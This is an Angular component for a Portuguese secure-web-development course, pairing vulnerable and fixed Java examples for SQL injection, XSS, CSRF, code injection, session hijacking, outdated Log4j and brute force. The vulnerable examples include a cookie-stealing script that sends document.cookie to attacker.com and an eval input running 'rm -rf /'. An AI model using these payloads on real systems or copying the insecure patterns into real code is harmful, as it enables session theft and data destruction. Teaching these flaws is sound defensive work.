import { Component, ChangeDetectionStrategy, signal, AfterViewInit, ViewChildren, ElementRef, QueryList, OnDestroy, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

interface SecurityTopic {
  id: string;
  title: string;
  icon: string; // SVG path data
  description: string;
  badPractice: {
    title: string;
    description: string;
    code: string;
    language: string;
  };
  goodPractice: {
    title: string;
    description: string;
    code: string;
    language: string;
  };
}

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css'],
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [CommonModule]
})
export class AppComponent implements AfterViewInit, OnDestroy {
  @ViewChildren('topicSection') topicSections!: QueryList<ElementRef<HTMLElement>>;

  private observer?: IntersectionObserver;
  private sanitizer = inject(DomSanitizer);

  safeHtml(text: string): SafeHtml {
    const html = text
      .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
      .replace(/`(.*?)`/g, '<code>$1</code>');
    return this.sanitizer.bypassSecurityTrustHtml(html);
  }
  
  readonly topics = signal<SecurityTopic[]>([
    {
      id: 'intro',
      title: 'Introdução à Segurança',
      icon: 'M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z',
      description: 'A segurança em aplicações web não é um extra, mas sim um requisito fundamental. Uma vulnerabilidade pode comprometer dados dos utilizadores, a reputação da empresa e levar a perdas financeiras significativas. Esta UFCD tem como objetivo principal criar uma mentalidade de desenvolvimento seguro desde o início do projeto.',
      badPractice: {
        title: "Mentalidade Insegura: 'A segurança vem depois'",
        description: "Adiar as considerações de segurança para o final do ciclo de desenvolvimento resulta em código vulnerável e custos de correção muito mais elevados.",
        code: `// 1. Desenvolver toda a funcionalidade.
// 2. Testar o caminho feliz.
// 3. Lançar para produção.
// 4. Esperar por um relatório de vulnerabilidade.
// 5. Corrigir reativamente.`,
        language: 'plaintext'
      },
      goodPractice: {
        title: "Abordagem Segura: 'Security by Design'",
        description: "Integrar a segurança em todas as fases do desenvolvimento, desde o planeamento e arquitetura até à implementação e manutenção contínua.",
        code: `// 1. Análise de requisitos de segurança.
// 2. Modelação de ameaças na fase de design.
// 3. Desenvolvimento com práticas seguras (ex: code reviews).
// 4. Testes de segurança automatizados e manuais (pentesting).
// 5. Monitorização contínua em produção.`,
        language: 'plaintext'
      }
    },
    {
      id: 'sql_injection',
      title: 'SQL Injection',
      icon: 'M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z',
      description: 'Ocorre quando um atacante consegue manipular consultas (queries) SQL executadas pela aplicação, permitindo-lhe visualizar, modificar ou apagar dados na base de dados.',
      badPractice: {
        title: 'Concatenação de Strings em Consultas SQL',
        description: 'Construir consultas SQL dinamicamente com dados introduzidos pelo utilizador é a porta de entrada para a injeção de SQL. Um atacante pode inserir código SQL malicioso nos campos de input.',
        code: `String userName = request.getParameter("user");
String query = "SELECT * FROM users WHERE name = '" + userName + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);`,
        language: 'java'
      },
      goodPractice: {
        title: 'Uso de Prepared Statements',
        description: 'Os Prepared Statements pré-compilam a consulta SQL e tratam os parâmetros como dados, e não como código executável. Isto neutraliza eficazmente a tentativa de injeção.',
        code: `String userName = request.getParameter("user");
String query = "SELECT * FROM users WHERE name = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userName);
ResultSet rs = pstmt.executeQuery();`,
        language: 'java'
      }
    },
    {
      id: 'xss',
      title: 'Cross-Site Scripting (XSS)',
      icon: 'M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4',
      description: 'Uma vulnerabilidade que permite a um atacante injetar scripts maliciosos (normalmente JavaScript) em páginas web vistas por outros utilizadores. Pode ser usada para roubar cookies de sessão, desfigurar sites, entre outros.',
      badPractice: {
        title: 'Apresentar Dados do Utilizador Diretamente no HTML',
        description: 'Se um comentário ou nome de utilizador que contém código HTML ou script é guardado e depois apresentado numa página sem qualquer tratamento, o navegador (browser) irá interpretá-lo e executá-lo.',
        code: `// JSP (JavaServer Pages) Exemplo
String comment = request.getParameter("comment");
// Se 'comment' for "<script>alert('XSS')</script>", o alerta será executado.
out.println("<p>" + comment + "</p>");`,
        language: 'java'
      },
      goodPractice: {
        title: 'Validar Inputs e Codificar Outputs (Defense in Depth)',
        description: 'A defesa mais eficaz contra XSS combina duas camadas. Primeiro, a **validação de input** para garantir que os dados recebidos estão no formato esperado (ex: apenas letras e números). Depois, e mais importante, o **output encoding** para garantir que quaisquer dados apresentados ao utilizador são tratados como texto pelo browser, e não como código executável.',
        code: `// 1. Validar o input (exemplo para um nome de utilizador)
String username = request.getParameter("username");
if (!username.matches("^[a-zA-Z0-9]+$")) {
    // Rejeitar o input inválido
    throw new SecurityException("Input de utilizador inválido.");
}

// 2. Codificar o output antes de o apresentar (defesa principal)
// Usando uma biblioteca como OWASP Java Encoder
String safeUsername = Encode.forHtml(username);

// O username validado e codificado é agora seguro para ser apresentado
out.println("<h1>Bem-vindo, " + safeUsername + "!</h1>");`,
        language: 'java'
      }
    },
    {
      id: 'csrf',
      title: 'Cross-Site Request Forgery (CSRF)',
      icon: 'M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v.01',
      description: 'Esta técnica engana um utilizador autenticado, levando-o a executar uma ação indesejada na aplicação. O atacante cria um link ou formulário malicioso que, quando acedido pela vítima, submete um pedido em seu nome, legítimo mas não intencional.',
      badPractice: {
        title: 'Confiar Apenas nos Cookies de Sessão',
        description: 'Se uma ação (ex: transferir dinheiro, apagar conta) é validada apenas com o cookie de sessão, um pedido forjado a partir de outro site será executado com sucesso porque o navegador envia os cookies automaticamente.',
        code: `// Um formulário simples para alterar a password
// Este pedido pode ser forjado por um atacante noutro site.
@PostMapping("/user/change-password")
public void changePassword(String newPassword) {
    // ... lógica para alterar a password do user autenticado
}`,
        language: 'java'
      },
      goodPractice: {
        title: 'Implementar Tokens Anti-CSRF',
        description: 'A aplicação gera um token único e secreto para cada sessão e exige que esse token seja incluído em todos os pedidos que alteram estado. O atacante não consegue adivinhar este token.',
        code: `// 1. Gerar token e colocar no formulário (como campo hidden) e na sessão.
// <input type="hidden" name="_csrf" value="unique-token-per-session" />

// 2. No backend, validar o token antes de processar o pedido.
@PostMapping("/user/change-password")
public void changePassword(HttpServletRequest request, String newPassword) {
    String sessionToken = (String) request.getSession().getAttribute("CSRF_TOKEN");
    String requestToken = request.getParameter("_csrf");

    if (sessionToken != null && sessionToken.equals(requestToken)) {
        // Token válido, processar o pedido
    } else {
        // Token inválido, rejeitar o pedido
    }
}`,
        language: 'java'
      }
    },
    {
      id: 'code_injection',
      title: 'Injeção de Código',
      icon: 'M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z',
      description: 'A injeção de código é uma vulnerabilidade que permite a um atacante injetar e executar código arbitrário no servidor. Isto pode acontecer quando a aplicação avalia ou executa dinamicamente código construído a partir de dados fornecidos pelo utilizador, levando a uma potencial tomada de controlo total do sistema.',
      badPractice: {
        title: 'Execução Dinâmica de Código Não Validado',
        description: 'Utilizar motores de script (como o Nashorn JavaScript engine do Java) para executar código construído com input do utilizador é extremamente perigoso. O atacante pode fornecer código que exfiltra dados ou executa comandos no sistema operativo.',
        code: `import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

// O 'userInput' vem de um pedido HTTP, ex: "10 + 5"
String userInput = request.getParameter("calculate");

ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("js");

// Perigoso: O motor executa qualquer código JavaScript fornecido.
// Se userInput for "java.lang.Runtime.getRuntime().exec('rm -rf /')",
// pode executar comandos destrutivos.
Object result = engine.eval(userInput);`,
        language: 'java'
      },
      goodPractice: {
        title: 'Evitar Execução Dinâmica e Usar API Seguras',
        description: 'A melhor defesa é evitar completamente a execução de código a partir de inputs. Em vez disso, mapeie os inputs do utilizador para um conjunto seguro e predefinido de operações. Se for absolutamente necessário, use bibliotecas de parsing de expressões matemáticas que são seguras.',
        code: `// Abordagem segura: Mapear operações
String operation = request.getParameter("op");
int a = Integer.parseInt(request.getParameter("a"));
int b = Integer.parseInt(request.getParameter("b"));
int result;

switch (operation) {
    case "add":
        result = a + b;
        break;
    case "subtract":
        result = a - b;
        break;
    default:
        throw new IllegalArgumentException("Operação inválida.");
}
// 'result' é calculado de forma segura sem 'eval'.`,
        language: 'java'
      }
    },
    {
        id: 'auth',
        title: 'Autenticação e Sessões',
        icon: 'M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17h-1v-1l-1.447-1.447A6 6 0 0115 7h0z',
        description: 'O **Sequestro de Sessão (Session Hijacking)** é um ataque no qual um ator malicioso rouba o identificador de sessão de um utilizador legítimo e o utiliza para se passar por esse utilizador. O ataque mais comum para roubar cookies de sessão é através de Cross-Site Scripting (XSS).',
        badPractice: {
          title: 'Roubo de Cookies de Sessão via XSS',
          description: 'Se a aplicação for vulnerável a XSS, um atacante pode injetar um script que rouba o cookie de sessão da vítima e o envia para um servidor controlado pelo atacante. Com este cookie, o atacante pode aceder à sessão da vítima.',
          code: `// Atacante injeta este 'comentário' numa página vulnerável a XSS:
String maliciousComment = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>";

// A aplicação vulnerável renderiza o comentário sem o codificar:
out.println("<p>" + maliciousComment + "</p>");
// O script é executado no browser da vítima, enviando o seu cookie.`,
          language: 'java'
        },
        goodPractice: {
          title: 'Usar Cookies Seguros e Forçar Comunicação via HTTPS',
          description: 'Uma defesa robusta combina várias camadas. Além de proteger os cookies com os atributos `HttpOnly` e `Secure`, é **obrigatório** que toda a comunicação ocorra sobre HTTPS (HTTP sobre TLS/SSL). O HTTPS encripta todos os dados em trânsito, incluindo os cookies de sessão, protegendo-os contra ataques de interceção de rede (Man-in-the-Middle). A validação de um certificado digital válido, emitido por uma autoridade de certificação (CA), garante que o cliente está a comunicar com o servidor autêntico e não com um impostor.',
          code: `<!-- Em web.xml (Configuração standard de Java EE) -->

<!-- 1. Configurar Cookies Seguros -->
<session-config>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
    </cookie-config>
</session-config>

<!-- 2. Forçar o uso de HTTPS em toda a aplicação -->
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Toda a aplicação</web-resource-name>
        <url-pattern>/*</url-pattern>
    </web-resource-collection>
    <user-data-constraint>
        <!-- CONFIDENTIAL significa que a comunicação deve ser encriptada (HTTPS) -->
        <transport-guarantee>CONFIDENTIAL</transport-guarantee>
    </user-data-constraint>
</security-constraint>`,
          language: 'xml'
        }
    },
    {
      id: 'known_vulnerabilities',
      title: 'Utilização de Componentes com Vulnerabilidades Conhecidas',
      icon: 'M20 7l-8-4-8 4m16 0l-8 4-8-4m16 0v11a2 2 0 01-2 2H6a2 2 0 01-2-2V7',
      description: 'As aplicações modernas dependem largamente de componentes e bibliotecas de terceiros (open-source ou comerciais). Se um destes componentes tiver uma falha de segurança conhecida, a sua aplicação herda essa vulnerabilidade, tornando-se um alvo fácil para ataques que exploram essas falhas.',
      badPractice: {
        title: 'Dependências Desatualizadas e Não Geridas',
        description: 'Incluir uma biblioteca num projeto e nunca mais a atualizar é uma prática de risco. Vulnerabilidades são descobertas constantemente, e usar uma versão antiga de uma biblioteca, como o Log4j, pode expor a aplicação a ataques críticos como o Log4Shell.',
        code: `<!-- pom.xml -->
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <!-- Versão criticamente vulnerável (Log4Shell) -->
        <version>2.14.1</version>
    </dependency>
</dependencies>`,
        language: 'xml'
      },
      goodPractice: {
        title: 'Gestão Ativa e Análise de Dependências',
        description: 'Utilize ferramentas de gestão de dependências (como o Maven ou Gradle) e integre scanners de segurança (OWASP Dependency-Check, Snyk, Dependabot) no seu ciclo de desenvolvimento. Mantenha as bibliotecas atualizadas para as versões mais recentes e estáveis.',
        code: `<!-- pom.xml -->
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <!-- Versão corrigida e segura -->
        <version>2.17.1</version> <!-- Ou mais recente -->
    </dependency>
</dependencies>

// Recomenda-se executar regularmente:
// mvn org.owasp:dependency-check-maven:check`,
        language: 'plaintext'
      }
    },
    {
      id: 'brute_force',
      title: 'Ataques de Força Bruta e Bloqueio de Conta',
      icon: 'M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z',
      description: 'Um ataque de força bruta consiste em tentar sistematicamente todas as combinações possíveis de passwords até encontrar a correta. Variantes modernas como o "Credential Stuffing" usam listas de credenciais roubadas de outras fugas de informação para tentar aceder a contas noutros serviços, explorando a reutilização de passwords pelos utilizadores.',
      badPractice: {
        title: 'Ausência de Limites de Tentativas de Login',
        description: 'Um formulário de login que não limita o número de tentativas falhadas permite que um atacante use scripts automatizados para testar milhões de combinações de passwords em pouco tempo, tornando a descoberta de uma password fraca apenas uma questão de tempo.',
        code: `// Endpoint de login vulnerável
@PostMapping("/login")
public ResponseEntity<String> login(String username, String password) {
    if (authService.credentialsAreValid(username, password)) {
        // ... Iniciar sessão do utilizador
        return ResponseEntity.ok("Login bem-sucedido!");
    } else {
        // Nenhuma penalização por tentativa falhada
        return ResponseEntity.status(401).body("Credenciais inválidas.");
    }
}`,
        language: 'java'
      },
      goodPractice: {
        title: 'Implementar Rate Limiting e Bloqueio de Conta',
        description: 'A mitigação eficaz envolve detetar e bloquear tentativas excessivas de login. Isto pode ser feito limitando o número de pedidos por IP (Rate Limiting) ou bloqueando temporariamente uma conta após um certo número de tentativas falhadas, tornando os ataques automatizados impraticáveis.',
        code: `// Lógica conceptual para um serviço de login
private final Map<String, Integer> failedAttempts = new ConcurrentHashMap<>();
private final Map<String, Long> lockedAccounts = new ConcurrentHashMap<>();
private static final int MAX_ATTEMPTS = 5;
private static final long LOCKOUT_DURATION_MS = 15 * 60 * 1000; // 15 minutos

public void handleLoginAttempt(String username, boolean success) {
    if (isAccountLocked(username)) {
        throw new AccountLockedException("Conta bloqueada temporariamente.");
    }

    if (success) {
        failedAttempts.remove(username); // Reset no sucesso
    } else {
        int attempts = failedAttempts.getOrDefault(username, 0) + 1;
        failedAttempts.put(username, attempts);

        if (attempts >= MAX_ATTEMPTS) {
            lockedAccounts.put(username, System.currentTimeMillis() + LOCKOUT_DURATION_MS);
            failedAttempts.remove(username);
            // Opcional: Notificar o utilizador sobre o bloqueio da conta
        }
    }
}

private boolean isAccountLocked(String username) {
    Long lockoutTime = lockedAccounts.get(username);
    if (lockoutTime == null) return false;
    
    if (System.currentTimeMillis() > lockoutTime) {
        lockedAccounts.remove(username); // O bloqueio expirou
        return false;
    }
    return true;
}`,
        language: 'java'
      }
    }
  ]);
  
  selectedTopicId = signal<string>('intro');

  ngAfterViewInit() {
    this.observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('is-visible');
            this.observer?.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.1 }
    );

    this.topicSections.forEach((section) => {
      this.observer?.observe(section.nativeElement);
    });

    setTimeout(() => {
      const Prism = (window as any).Prism;
      if (Prism) Prism.highlightAll();
    }, 50);
  }

  ngOnDestroy() {
    this.observer?.disconnect();
  }

  selectTopic(id: string): void {
    this.selectedTopicId.set(id);
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }
}